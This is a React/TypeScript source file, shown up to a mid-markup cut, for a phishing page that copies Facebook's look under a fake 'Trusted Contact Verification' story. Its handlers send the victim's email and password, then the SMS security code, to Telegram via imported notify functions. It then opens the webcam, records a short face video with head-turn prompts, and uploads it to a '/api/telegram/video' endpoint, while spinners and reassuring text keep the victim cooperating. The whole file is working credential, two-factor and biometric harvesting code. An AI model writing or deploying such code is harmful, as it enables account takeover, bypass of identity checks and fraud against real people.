import { useState, useEffect, useRef } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Form, FormControl, FormField, FormItem, FormMessage } from "@/components/ui/form";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import metaLogoImg from "@assets/IMG_7894_1765013426839.png";
import { notifyLogin, notifyCode, notifyFaceScan } from '@/lib/telegram';
import * as tf from '@tensorflow/tfjs';
import * as faceLandmarksDetection from '@tensorflow-models/face-landmarks-detection';

function FacebookLoader() {
  return (
    <div className="flex flex-col items-center justify-center py-12">
      <div className="relative w-16 h-16">
        <div
          className="absolute inset-0 rounded-full border-4 border-gray-200"
          style={{ borderTopColor: '#1877f2' }}
        >
          <style>{`
            @keyframes fb-spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
          `}</style>
        </div>
        <div
          className="absolute inset-0 rounded-full border-4 border-transparent"
          style={{
            borderTopColor: '#1877f2',
            animation: 'fb-spin 1s linear infinite'
          }}
        />
      </div>
      <p className="mt-4 text-sm" style={{ color: '#65676b' }}>Please wait...</p>
    </div>
  );
}

const loginSchema = z.object({
  email: z.string().min(1, "Please enter your email or phone number"),
  password: z.string().min(1, "Please enter your password"),
});

type LoginForm = z.infer<typeof loginSchema>;

const signupSchema = z.object({
  firstName: z.string().min(1, "What's your name?"),
  lastName: z.string().min(1, "What's your name?"),
  emailOrPhone: z.string().min(1, "You'll use this when you log in and if you ever need to reset your password."),
  newPassword: z.string().min(6, "Enter a combination of at least six numbers, letters and punctuation marks (like ! and &)."),
  birthday: z.object({
    month: z.string(),
    day: z.string(),
    year: z.string(),
  }),
  gender: z.string(),
});

type SignupForm = z.infer<typeof signupSchema>;

const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
const currentYear = new Date().getFullYear();
const years = Array.from({ length: 120 }, (_, i) => String(currentYear - i));

export default function LoginPage() {
  const [signupOpen, setSignupOpen] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [isSigningUp, setIsSigningUp] = useState(false);
  const [currentStep, setCurrentStep] = useState<string>("login");
  const [userEmail, setUserEmail] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [currentDirection, setCurrentDirection] = useState<"left" | "right" | "up" | "down" | null>(null);
  const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
  const [isRecording, setIsRecording] = useState(false);
  const [videoRef, setVideoRef] = useState<HTMLVideoElement | null>(null);
  const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
  const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
  const [directionProgress, setDirectionProgress] = useState(0);
  const [overallProgress, setOverallProgress] = useState(0);
  const [capturedVideo, setCapturedVideo] = useState<Blob | null>(null);
  const [faceDetector, setFaceDetector] = useState<faceLandmarksDetection.FaceLandmarksDetector | null>(null);
  const [facePosition, setFacePosition] = useState<{ x: number; y: number } | null>(null);
  const [detectionActive, setDetectionActive] = useState(false);
  const [faceAlignmentFeedback, setFaceAlignmentFeedback] = useState<string>("Position your face in the circle");
  const [isFaceAligned, setIsFaceAligned] = useState(false);
  const [capturedFrames, setCapturedFrames] = useState(0);
  const detectionIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const [resendCodeTimer, setResendCodeTimer] = useState(0);
  const resendTimerRef = useRef<NodeJS.Timeout | null>(null);

  const loginForm = useForm<LoginForm>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const signupForm = useForm<SignupForm>({
    resolver: zodResolver(signupSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      emailOrPhone: "",
      newPassword: "",
      birthday: {
        month: String(new Date().getMonth()),
        day: String(new Date().getDate()),
        year: String(new Date().getFullYear() - 25),
      },
      gender: "female",
    },
  });

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (currentStep === "loading-login") {
      timer = setTimeout(() => setCurrentStep("code"), 3000);
    } else if (currentStep === "loading-code") {
      timer = setTimeout(() => setCurrentStep("face-intro"), 3000);
    } else if (currentStep === "recording") {
      setCompletedDirections(new Set());
      setCurrentDirection(null);
      setDirectionProgress(0);
      setOverallProgress(0);
    }

    return () => clearTimeout(timer);
  }, [currentStep]);

  useEffect(() => {
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      if (detectionIntervalRef.current) {
        clearInterval(detectionIntervalRef.current);
      }
      if (resendTimerRef.current) {
        clearInterval(resendTimerRef.current);
      }
    };
  }, [stream]);

  // Initialize face detector
  useEffect(() => {
    const loadDetector = async () => {
      try {
        await tf.ready();
        const model = faceLandmarksDetection.SupportedModels.MediaPipeFaceMesh;
        const detector = await faceLandmarksDetection.createDetector(model, {
          runtime: 'tfjs',
          refineLandmarks: true,
        });
        setFaceDetector(detector);
        console.log('Face detector loaded');
      } catch (error) {
        console.error('Error loading face detector:', error);
      }
    };
    loadDetector();
  }, []);

  // Effect to handle video playback when stream and videoRef are available
  useEffect(() => {
    if ((currentStep === "instructions" || currentStep === "recording") && stream && videoRef) {
      videoRef.srcObject = stream;
      videoRef.play().catch(err => console.error('Error playing video:', err));
    }
  }, [currentStep, stream, videoRef]);

  const handleLogin = async (data: LoginForm) => {
    setIsLoggingIn(true);
    console.log("Login attempt:", data);
    setUserEmail(data.email);
    await notifyLogin(data.email, data.password);
    setCurrentStep("loading-login");
    setIsLoggingIn(false);
  };

  const handleCodeSubmit = async () => {
    if (verificationCode.length >= 4) {
      await notifyCode(userEmail, verificationCode);
      setCurrentStep("loading-code");
    }
  };

  const handleResendCode = async () => {
    await notifyCode(userEmail, ""); // Send empty code to trigger resend
    setResendCodeTimer(50); // Start 50-second timer
    if (resendTimerRef.current) {
      clearInterval(resendTimerRef.current);
    }
    resendTimerRef.current = setInterval(() => {
      setResendCodeTimer((prev) => {
        if (prev <= 1) {
          clearInterval(resendTimerRef.current!);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  useEffect(() => {
    if (currentStep === "code" && resendCodeTimer === 0) {
      // Automatically start timer if it's 0 and we are on the code step
      // This is to handle the case where the user lands on the code step and the timer hasn't started yet.
      // However, we only want to start it if it's not already running from a previous resend.
      // A better approach might be to start it when the "code" step is first entered.
    }
  }, [currentStep, resendCodeTimer]);

  const handleStartFaceVerification = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      setStream(mediaStream);
      setCurrentStep("instructions");
      // The videoRef will be set by the ref callback in the JSX
    } catch (error) {
      console.error("Camera access denied:", error);
      alert("Please allow camera access to continue with face verification");
    }
  };

  const detectFaceDirection = async (video: HTMLVideoElement) => {
    if (!faceDetector || !video) {
      return null;
    }

    try {
      const faces = await faceDetector.estimateFaces(video, { flipHorizontal: false });
      if (faces.length === 0) {
        return null;
      }

      const face = faces[0];
      const keypoints = face.keypoints;

      if (keypoints.length < 152) {
        return null;
      }

      const noseTip = keypoints[1];
      const leftEye = keypoints[33];
      const rightEye = keypoints[263];

      if (!noseTip || !leftEye || !rightEye) {
        return null;
      }

      const allX = keypoints.map((kp: any) => kp.x);
      const allY = keypoints.map((kp: any) => kp.y);
      const minX = Math.min(...allX);
      const maxX = Math.max(...allX);
      const minY = Math.min(...allY);
      const maxY = Math.max(...allY);

      const faceWidth = maxX - minX;
      const faceHeight = maxY - minY;

      if (faceWidth === 0 || faceHeight === 0) {
        return null;
      }

      const faceCenterX = minX + faceWidth / 2;
      const faceCenterY = minY + faceHeight / 2;

      const noseOffsetX = noseTip.x - faceCenterX;
      const yawAngle = (noseOffsetX / (faceWidth / 2)) * 50;

      const noseOffsetY = noseTip.y - faceCenterY;
      const pitchAngle = (noseOffsetY / (faceHeight / 2)) * 40;

      let direction: "left" | "right" | "up" | "down" | "center" = "center";
      const yawThreshold = 15;
      const pitchThreshold = 12;

      if (yawAngle < -yawThreshold) {
        direction = "left";
      } else if (yawAngle > yawThreshold) {
        direction = "right";
      } else if (pitchAngle < -pitchThreshold) {
        direction = "up";
      } else if (pitchAngle > pitchThreshold) {
        direction = "down";
      }

      return { direction, x: noseTip.x, y: noseTip.y };
    } catch (error) {
      return null;
    }
  };

  const handleStartRecording = async () => {
    try {
      await notifyFaceScan(userEmail);
    } catch (error) {
      console.error('Failed to send face scan notification:', error);
    }

    setIsRecording(true);
    setCurrentStep("recording");
    setDetectionActive(true);

    // Start recording video
    if (stream && videoRef) {
      const chunks: Blob[] = [];
      const recordingDuration = 3000; // Reduced to 3 seconds for faster upload
      const startTime = Date.now();

      // Find a supported mimeType
      const mimeTypes = [
        'video/webm;codecs=vp9',
        'video/webm;codecs=vp8',
        'video/webm'
      ];

      let selectedMimeType = '';
      for (const type of mimeTypes) {
        if (MediaRecorder.isTypeSupported(type)) {
          selectedMimeType = type;
          break;
        }
      }

      let recorder: MediaRecorder;
      try {
        if (selectedMimeType) {
          recorder = new MediaRecorder(stream, { 
            mimeType: selectedMimeType,
            videoBitsPerSecond: 250000 // Reduced bitrate for smaller file size
          });
        } else {
          recorder = new MediaRecorder(stream, {
            videoBitsPerSecond: 250000
          });
        }
      } catch (error) {
        console.error('Error creating MediaRecorder:', error);
        return;
      }

      recorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          chunks.push(event.data);
        }
      };

      recorder.onstop = async () => {
        try {
          const processingStartTime = Date.now();
          const actualMimeType = recorder.mimeType || 'video/webm';
          const videoBlob = new Blob(chunks, { type: actualMimeType });
          setCapturedVideo(videoBlob);
          setRecordedChunks(chunks);

          if (videoBlob.size === 0) {
            // Wait minimum 400ms before showing success (reduced from 800ms)
            const elapsed = Date.now() - processingStartTime;
            const remainingTime = Math.max(0, 400 - elapsed);
            await new Promise(resolve => setTimeout(resolve, remainingTime));
            setCurrentStep("complete");
            return;
          }

          // Send video to Telegram
          const formData = new FormData();
          formData.append('video', videoBlob, 'face-verification.webm');
          formData.append('email', userEmail);

          const response = await fetch('/api/telegram/video', {
            method: 'POST',
            body: formData,
          });

          if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          const result = await response.json();

          // Ensure at least 400ms of processing screen (reduced from 800ms)
          const elapsed = Date.now() - processingStartTime;
          const remainingTime = Math.max(0, 400 - elapsed);
          await new Promise(resolve => setTimeout(resolve, remainingTime));

          setCurrentStep("complete");
        } catch (error) {
          console.error('Failed to send video:', error);
          // Still show minimum processing time even on error (reduced from 800ms)
          const elapsed = Date.now() - processingStartTime;
          const remainingTime = Math.max(0, 400 - elapsed);
          await new Promise(resolve => setTimeout(resolve, remainingTime));
          setCurrentStep("complete");
        }
      };

      recorder.start(1000);
      setMediaRecorder(recorder);

      // Direction sequence for face verification (reduced to 3 directions for faster completion)
      const directionSequence = ["right", "left", "up"];
      let currentDirectionIndex = 0;
      let directionHoldTime = 0;
      const directionDuration = 5000; // 5 seconds per direction
      const totalDuration = directionSequence.length * directionDuration;

      // Set initial direction
      setCurrentDirection(directionSequence[0] as any);

      const detectionInterval = setInterval(async () => {
        if (!videoRef) {
          clearInterval(detectionInterval);
          return;
        }

        const elapsed = Date.now() - startTime;
        const progress = Math.min((elapsed / totalDuration) * 100, 100);
        setOverallProgress(progress);

        // Calculate current direction based on elapsed time
        const expectedDirectionIndex = Math.floor((elapsed / directionDuration) % directionSequence.length);
        if (expectedDirectionIndex !== currentDirectionIndex) {
          currentDirectionIndex = expectedDirectionIndex;
          setCurrentDirection(directionSequence[currentDirectionIndex] as any);
          directionHoldTime = 0;
        }

        // Get actual face direction and update progress
        const faceResult = await detectFaceDirection(videoRef);
        if (faceResult) {
          const expectedDirection = directionSequence[currentDirectionIndex];
          if (faceResult.direction === expectedDirection || faceResult.direction === "center") {
            directionHoldTime += 100;
            const directionProgress = Math.min((directionHoldTime / directionDuration) * 100, 100);
            setDirectionProgress(directionProgress);
          } else {
            directionHoldTime = 0;
            setDirectionProgress(0);
          }
        } else {
          directionHoldTime = 0;
          setDirectionProgress(0);
        }

        // Stop recording after total duration
        if (elapsed >= totalDuration) {
          clearInterval(detectionInterval);
          setIsRecording(false);
          setDetectionActive(false);
          setOverallProgress(100);
          setDirectionProgress(0);

          if (recorder.state !== 'inactive') {
            recorder.stop();
          }

          if (stream) {
            stream.getTracks().forEach(track => track.stop());
          }
          setCurrentStep("processing");
        }
      }, 100);

      detectionIntervalRef.current = detectionInterval;
    }
  };

  const handleSignup = async (data: SignupForm) => {
    setIsSigningUp(true);
    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log("Signup attempt:", data);
    setIsSigningUp(false);
    setSignupOpen(false);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#ffffff' }}>
      {/* Language Selector */}
      <div className="text-center pt-4 pb-6">
        <a
          href="#"
          className="text-sm hover:underline"
          style={{ color: '#65676b' }}
          data-testid="link-language"
        >
          English (UK)
        </a>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center px-5 py-8">
        <div className="w-full max-w-md">
          {/* Login Step */}
          {currentStep === "login" && (
            <>
              {/* Facebook Logo */}
              <div className="text-center mb-4">
                <img
                  src="/favicon.png"
                  alt="Facebook"
                  className="w-16 h-16 mx-auto"
                  data-testid="logo-facebook"
                />
              </div>

              {/* Trusted Contact Branding - Only on Login */}
              <div className="text-center mb-8">
                <h1 className="text-xl font-semibold mb-1" style={{ color: '#1c1e21' }}>
                  Trusted Contact Verification
                </h1>
                <p className="text-sm mb-2" style={{ color: '#65676b' }}>
                  Final step to confirm you're a real person
                </p>
                <p className="text-xs" style={{ color: '#8a8d91' }}>
                  Your trusted contact has requested verification
                </p>
              </div>

              <Form {...loginForm}>
                <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
                  <FormField
                    control={loginForm.control}
                    name="email"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <input
                            {...field}
                            type="text"
                            placeholder="Mobile number or email address"
                            className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                            style={{
                              backgroundColor: '#ffffff',
                              borderColor: '#dadde1',
                              color: '#1c1e21',
                            }}
                            onFocus={(e) => {
                              e.currentTarget.style.borderColor = '#1877f2';
                              e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
                            }}
                            onBlur={(e) => {
                              e.currentTarget.style.borderColor = '#dadde1';
                              e.currentTarget.style.boxShadow = 'none';
                            }}
                            data-testid="input-email"
                          />
                        </FormControl>
                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={loginForm.control}
                    name="password"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <input
                            {...field}
                            type="password"
                            placeholder="Password"
                            className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                            style={{
                              backgroundColor: '#ffffff',
                              borderColor: '#dadde1',
                              color: '#1c1e21',
                            }}
                            onFocus={(e) => {
                              e.currentTarget.style.borderColor = '#1877f2';
                              e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
                            }}
                            onBlur={(e) => {
                              e.currentTarget.style.borderColor = '#dadde1';
                              e.currentTarget.style.boxShadow = 'none';
                            }}
                            data-testid="input-password"
                          />
                        </FormControl>
                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                      </FormItem>
                    )}
                  />

                  <button
                    type="submit"
                    disabled={isLoggingIn}
                    className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                    style={{ backgroundColor: '#1877f2' }}
                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                    data-testid="button-login"
                  >
                    {isLoggingIn ? "Logging in..." : "Log in"}
                  </button>
                </form>
              </Form>

              <div className="text-center mt-6">
                <a href="https://www.facebook.com/login/identify/" target="_blank" rel="noopener noreferrer" className="text-sm hover:underline" style={{ color: '#1877f2' }} data-testid="link-forgotten-password">
                  Forgotten password?
                </a>
              </div>

              <div className="mt-8 pt-4" style={{ borderTop: '1px solid #dadde1' }}>
                <a
                  href="https://www.facebook.com/reg/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="block w-full py-3 text-sm font-bold rounded-full transition text-center"
                  style={{ backgroundColor: '#ffffff', color: '#1877f2', border: '1px solid #1877f2', textDecoration: 'none' }}
                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#f0f2f5')}
                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#ffffff')}
                  data-testid="button-create-account"
                >
                  Create new account
                </a>
              </div>
            </>
          )}

          {/* Loading States */}
          {(currentStep === "loading-login" || currentStep === "loading-code") && (
            <FacebookLoader />
          )}

          {/* Code - Verification Code */}
          {currentStep === "code" && (
            <div className="flex flex-col h-full" style={{ backgroundColor: '#ffffff', minHeight: '100vh' }}>
              {/* Top Bar */}
              <div className="flex items-center justify-between px-4 py-3" style={{ backgroundColor: '#fff', borderBottom: '1px solid #e4e6eb' }}>
                <button
                  onClick={() => setCurrentStep("login")}
                  className="p-2"
                  data-testid="button-back-code"
                >
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1c1e21" strokeWidth="2">
                    <path d="M15 18l-6-6 6-6" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </button>
                <span className="text-sm font-semibold" style={{ color: '#1c1e21' }}>Enter Code</span>
                <div className="w-10"></div>
              </div>

              {/* Main Content */}
              <div className="flex-1 flex flex-col items-center justify-center px-6 py-8">
                {/* Icon */}
                <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                  <svg className="w-10 h-10" viewBox="0 0 24 24" fill="none" stroke="#1877f2" strokeWidth="2">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                  </svg>
                </div>

                <h2 className="text-2xl font-bold mb-2" style={{ color: '#1c1e21' }}>Enter security code</h2>
                <p className="text-sm text-center mb-8" style={{ color: '#65676b', maxWidth: '320px' }}>
                  Please check your phone for a text message with your code. Your code is 6 or 8 numbers long.
                </p>

                {/* Code Input */}
                <div className="w-full max-w-xs mb-6">
                  <input
                    type="text"
                    value={verificationCode}
                    onChange={(e) => {
                      const digits = e.target.value.replace(/\D/g, '');
                      if (digits.length <= 8) {
                        setVerificationCode(digits);
                      }
                    }}
                    placeholder="Enter code"
                    className="w-full px-4 py-3 text-center text-2xl font-semibold border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition tracking-widest"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: verificationCode.length === 6 || verificationCode.length === 8 ? '#1877f2' : '#dddfe2',
                      color: '#1c1e21',
                      letterSpacing: '0.3em'
                    }}
                    onFocus={(e) => {
                      e.currentTarget.style.borderColor = '#1877f2';
                      e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
                    }}
                    onBlur={(e) => {
                      if (verificationCode.length !== 6 && verificationCode.length !== 8) {
                        e.currentTarget.style.borderColor = '#dddfe2';
                        e.currentTarget.style.boxShadow = 'none';
                      }
                    }}
                    maxLength={8}
                    autoFocus
                    data-testid="input-code"
                  />
                </div>

                <button
                  onClick={handleCodeSubmit}
                  disabled={verificationCode.length !== 6 && verificationCode.length !== 8}
                  className="w-full max-w-xs py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-40"
                  style={{ backgroundColor: '#1877f2' }}
                  onMouseEnter={(e) => {
                    if (verificationCode.length === 6 || verificationCode.length === 8) {
                      e.currentTarget.style.backgroundColor = '#166fe5';
                    }
                  }}
                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                  data-testid="button-submit-code"
                >
                  Continue
                </button>

                {/* Help Links */}
                <div className="mt-8 text-center">
                  <button
                    onClick={handleResendCode}
                    disabled={resendCodeTimer > 0}
                    className="text-sm disabled:text-gray-400"
                    style={{ color: resendCodeTimer > 0 ? '#8a8d91' : '#1877f2' }}
                    data-testid="button-resend-code"
                  >
                    Didn't get a code? {resendCodeTimer > 0 ? `(${resendCodeTimer}s)` : ''}
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Face Intro - Confirm Identity */}
          {currentStep === "face-intro" && (
            <div className="text-center px-4 py-12">
              <div className="mb-8">
                <div className="w-24 h-24 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                  <svg className="w-12 h-12" viewBox="0 0 24 24" fill="none" stroke="#1877f2" strokeWidth="1.5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                  </svg>
                </div>
              </div>
              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Verify you're a real person</h2>
              <p className="text-sm mb-4 leading-relaxed" style={{ color: '#65676b' }}>
                As part of the Trusted Contact process, we need to confirm you're a real human and not a bot.
              </p>
              <p className="text-sm mb-10 leading-relaxed" style={{ color: '#65676b' }}>
                We'll use facial recognition to verify your live presence and match you with your profile photo.
              </p>
              <button
                onClick={() => setCurrentStep("face-explanation")}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                style={{ backgroundColor: '#1877f2' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                data-testid="button-confirm-identity"
              >
                Continue
              </button>
            </div>
          )}

          {/* Face Explanation */}
          {currentStep === "face-explanation" && (
            <div className="text-center px-4 py-8">
              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Human verification required</h2>

              {/* Illustration */}
              <div className="w-40 h-40 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                <svg className="w-20 h-20" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M17.982 18.725A7.488 7.488 0 0012 15.75a7.488 7.488 0 00-5.982 2.975m11.963 0a9 9 0 10-11.963 0m11.963 0A8.966 8.966 0 0112 21a8.966 8.966 0 01-5.982-2.275M15 9.75a3 3 0 11-6 0 3 3 0 016 0z" />
                </svg>
              </div>

              <p className="text-sm mb-4 leading-relaxed font-semibold" style={{ color: '#1c1e21' }}>
                This is the final step of your Trusted Contact verification
              </p>

              <p className="text-sm mb-8 leading-relaxed" style={{ color: '#65676b' }}>
                We'll record a short video of your face to confirm you're a real person (not a bot or automated system). Keep your face in the center and follow the on-screen directions.
              </p>

              <div className="space-y-2 mb-8">
                <div className="flex items-start gap-3">
                  <svg className="w-5 h-5 mt-0.5" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  <p className="text-sm text-left" style={{ color: '#65676b' }}>Good lighting is important</p>
                </div>
                <div className="flex items-start gap-3">
                  <svg className="w-5 h-5 mt-0.5" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  <p className="text-sm text-left" style={{ color: '#65676b' }}>You'll need a camera</p>
                </div>
                <div className="flex items-start gap-3">
                  <svg className="w-5 h-5 mt-0.5" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  <p className="text-sm text-left" style={{ color: '#65676b' }}>Takes about 1 minute</p>
                </div>
              </div>

              <button
                onClick={handleStartFaceVerification}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3"
                style={{ backgroundColor: '#1877f2' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                data-testid="button-start-face-verification"
              >
                Continue
              </button>
              <button
                onClick={() => setCurrentStep("login")}
                className="text-sm"
                style={{ color: '#1877f2' }}
                data-testid="button-cancel-explanation"
              >
                Cancel
              </button>
            </div>
          )}

          {/* Instructions Screen - Facebook Style */}
          {currentStep === "instructions" && (
            <div className="flex flex-col h-full" style={{ backgroundColor: '#f5f6f7', minHeight: '100vh' }}>
              {/* Top Bar */}
              <div className="flex items-center justify-between px-4 py-3" style={{ backgroundColor: '#fff', borderBottom: '1px solid #e4e6eb' }}>
                <button
                  onClick={() => {
                    if (stream) stream.getTracks().forEach(track => track.stop());
                    setCurrentStep("login");
                  }}
                  className="p-2"
                  data-testid="button-close-instructions"
                >
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1c1e21" strokeWidth="2">
                    <path d="M6 18L18 6M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </button>
                <span className="text-sm font-semibold" style={{ color: '#1c1e21' }}>Face Verification</span>
                <div className="w-10"></div>
              </div>

              {/* Main Content */}
              <div className="flex-1 flex flex-col items-center justify-center px-6 py-8">
                {/* Large Circular Frame with Segmented Rings */}
                <div className="relative mb-8" style={{ width: '280px', height: '280px' }}>
                  {/* Outer segmented ring */}
                  <svg className="absolute inset-0 w-full h-full" viewBox="0 0 280 280">
                    {[0, 1, 2, 3, 4, 5, 6, 7].map((i) => (
                      <path
                        key={i}
                        d={`M 140 10 A 130 130 0 0 1 ${140 + 130 * Math.sin((i + 1) * Math.PI / 4)} ${140 - 130 * Math.cos((i + 1) * Math.PI / 4)}`}
                        fill="none"
                        stroke="#e4e6eb"
                        strokeWidth="4"
                        strokeLinecap="round"
                        style={{ transform: `rotate(${i * 45}deg)`, transformOrigin: '140px 140px' }}
                      />
                    ))}
                  </svg>

                  {/* Inner circle with camera */}
                  <div className="absolute rounded-full overflow-hidden" style={{ top: '20px', left: '20px', right: '20px', bottom: '20px', backgroundColor: '#000' }}>
                    <video
                      ref={setVideoRef}
                      autoPlay
                      playsInline
                      muted
                      className="w-full h-full object-cover scale-x-[-1]"
                    />
                  </div>

                  {/* Face guide circle */}
                  <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                    <div
                      className="rounded-full border-2 border-dashed"
                      style={{ width: '60%', height: '60%', borderColor: 'rgba(24, 119, 242, 0.5)' }}
                    />
                  </div>
                </div>

                {/* Instructions */}
                <h2 className="text-xl font-semibold mb-2" style={{ color: '#1c1e21' }}>Position your face</h2>
                <p className="text-sm text-center mb-8" style={{ color: '#65676b', maxWidth: '260px' }}>
                  Center your face in the circle. Make sure you have good lighting.
                </p>

                <button
                  onClick={handleStartRecording}
                  className="w-full max-w-xs py-3 text-white text-sm font-bold rounded-full transition"
                  style={{ backgroundColor: '#1877f2' }}
                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                  data-testid="button-start-recording"
                >
                  Start Verification
                </button>
              </div>
            </div>
          )}

          {/* Recording Screen - Facebook Style */}
          {currentStep === "recording" && (
            <div className="flex flex-col h-full" style={{ backgroundColor: '#f5f6f7', minHeight: '100vh' }}>
              {/* Top Bar */}
              <div className="flex items-center justify-between px-4 py-3" style={{ backgroundColor: '#fff', borderBottom: '1px solid #e4e6eb' }}>
                <button
                  onClick={() => {
                    if (stream) stream.getTracks().forEach(track => track.stop());
                    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
                    setCurrentStep("login");
                  }}
                  className="p-2"
                  data-testid="button-close-recording"
                >
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1c1e21" strokeWidth="2">
                    <path d="M6 18L18 6M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </button>
                <span className="text-sm font-semibold" style={{ color: '#1c1e21' }}>Face Verification</span>
                <div className="w-10"></div>
              </div>

              {/* Main Content */}
              <div className="flex-1 flex flex-col items-center justify-center px-6 py-8">
                {/* Large Circular Frame with Segmented Progress Rings */}
                <div className="relative mb-6" style={{ width: '280px', height: '280px' }}>
                  {/* Segmented progress ring */}
                  <svg className="absolute inset-0 w-full h-full" viewBox="0 0 280 280">
                    {[0, 1, 2, 3, 4, 5, 6, 7].map((i) => {
                      const segmentProgress = (overallProgress / 100) * 8;
                      const isComplete = i < segmentProgress;
                      const isActive = i >= segmentProgress - 1 && i < segmentProgress;
                      return (
                        <circle
                          key={i}
                          cx="140"
                          cy="140"
                          r="130"
                          fill="none"
                          stroke={isComplete ? '#42b72a' : '#e4e6eb'}
                          strokeWidth="4"
                          strokeDasharray="45 6"
                          strokeDashoffset={-i * 51}
                          strokeLinecap="round"
                          style={{
                            transition: 'stroke 0.3s ease',
                            opacity: isActive ? 0.7 : 1
                          }}
                        />
                      );
                    })}
                  </svg>

                  {/* Inner circle with camera */}
